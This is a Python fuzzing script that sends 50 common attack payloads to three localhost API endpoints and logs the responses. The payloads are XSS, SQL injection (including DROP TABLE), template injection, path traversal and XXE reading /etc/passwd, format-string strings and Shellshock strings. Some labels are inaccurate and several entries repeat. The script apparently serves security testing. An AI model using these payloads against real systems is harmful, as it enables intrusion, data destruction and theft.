import requests
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor, as_completed
import csv
import random
import string
import json

# The URL of the API you're testing
base_url = 'http://127.0.0.1:8080'

# Different API endpoints
endpoints = ['/login', '/calculate', '/signup']

# List of common payloads
payloads = [
    "<script>alert('XSS')</script>",  # 1. XSS
    "'; DROP TABLE users; --",  # 2. SQL Injection
    "1' OR '1'='1",  # 3. SQL Injection
    '<img src="x" onerror="alert(\'XSS\')"> ',  # 4. XSS
    '<svg/onload=alert("XSS")>',  # 5. XSS
    "${7*7}",  # 6. Template Injection
    "${7*'7'}",  # 7. Template Injection
    "{{7*7}}",  # 8. Template Injection
    "{{7*'7'}}",  # 9. Template Injection
    'a\' OR \'a\'=\'a',  # 10. SQL Injection
    "\";|]*{${@{print(chr(35).chr(49).chr(49).chr(52).chr(52).chr(52).chr(53))}}}\"",  # 11. Command Injection
    "^",  # 12. Regex DoS (ReDoS)
    "$HOME",  # 13. Path Traversal
    "../../../../../../../etc/passwd",  # 14. Path Traversal
    "../../../../../../../etc/hosts",  # 15. Path Traversal
    "%s%s%s%s%s",  # 16. Format string exploit
    "%x%x%x%x",  # 17. Format string exploit
    "%n%n%n%n",  # 18. Format string exploit
    "2147483648",  # 19. Integer Overflow
    "-2147483649",  # 20. Integer Underflow
    '0.000000000000000000000000000000000000000000000000000000000000000000000000000001',  # 21. Floating point precision problem
    '/dev/random',  # 22. Resource exhaustion
    '/dev/zero',  # 23. Resource exhaustion
    '%p%p%p%p',  # 24. Memory disclosure
    '%2e%2e%2f',  # 25. URL encoded Path Traversal
    '%252e%252e%252f',  # 26. Double URL encoded Path Traversal
    '%c0%ae%c0%ae/',  # 27. Invalid unicode Path Traversal
    '%uff0e%uff0e%u2215',  # 28. Overlong unicode Path Traversal
    '%c0%23%c0%aF',  # 29. Non-standard unicode encoding Path Traversal
    '.../...//',  # 30. Path Traversal using dots
    '...\\.\\...\\\\',  # 31. Windows Path Traversal using dots
    '\\\\*\\\\',  # 32. Windows SMB resource exhaustion
    '<!ENTITY xxe SYSTEM "file:///etc/passwd">',  # 33. XML External Entity attack (XXE)
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',  # 34. XXE
    '() { :;}; /bin/bash -c "echo CVE-2014-6271 patched"',  # 35. Shellshock
    '() { _; } >_',  # 36. Shellshock
    '() { echo Hello; }',  # 37. Shellshock
    '() { :;}; echo vulnerable',  # 38. Shellshock
    '() { _; } >_',  # 39. Shellshock
    '() {(a)=>\'',  # 40. Shellshock
    '() { :;}; echo AYYY',  # 41. Shellshock
    '() {(a)=>\'',  # 42. Shellshock
    '() { _; } >_',  # 43. Shellshock
    '() { _; } >_',  # 44. Shellshock
    '() { echo Hello; }',  # 45. Shellshock
    '() {(a)=>\'',  # 46. Shellshock
    '() { :;}; echo AYYY',  # 47. Shellshock
    '() { _; } >_',  # 48. Shellshock
    '() { _; } >_',  # 49. Shellshock
    '() { :;}; /bin/bash -c "echo CVE-2014-6271 patched"'  # 50. Shellshock
]

# List of HTTP methods to fuzz
methods = ["GET", "POST", "PUT", "DELETE"]

# Instantiate a UserAgent object to generate random user agents
ua = UserAgent()

def generate_random_string(length):
    return ''.join(random.choice(string.ascii_letters) for i in range(length))

def fuzz_payloads(endpoint, payload, method):
    headers = {
        "User-Agent": ua.random, 
        "X-CSRFToken": generate_random_string(20),  # Fuzzing CSRF tokens
        "Referer": generate_random_string(50),  # Fuzzing Referer
        "Content-Type": random.choice(["application/json", "application/x-www-form-urlencoded"]),
    }

    # Choose data format based on Content-Type
    if headers["Content-Type"] == "application/json":
        data = json.dumps({"input": payload})
    else:
        data = f"input={payload}"

    try:
        response = requests.request(method, f'{base_url}{endpoint}', headers=headers, data=data)
        status_code = response.status_code
        response_length = len(response.text)
        with open('payload_fuzzing.csv', 'a', newline='') as csv_file:
            csv_writer = csv.writer(csv_file)
            csv_writer.writerow([endpoint, payload, method, status_code, response_length])
    except Exception as e:
        with open('payload_fuzzing.csv', 'a', newline='') as csv_file:
            csv_writer = csv.writer(csv_file)
            csv_writer.writerow([endpoint, payload, method, 'error', str(e)])

def main():
    with open('payload_fuzzing.csv', 'w', newline='') as csv_file:
        csv_writer = csv.writer(csv_file)
        csv_writer.writerow(['endpoint', 'payload', 'method', 'status_code', 'response_length'])

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for endpoint in endpoints:
            for payload in payloads:
                for method in methods:
                    futures.append(executor.submit(fuzz_payloads, endpoint, payload, method))

        for future in as_completed(futures):
            pass  # or handle completed futures if needed

if __name__ == '__main__':
    main()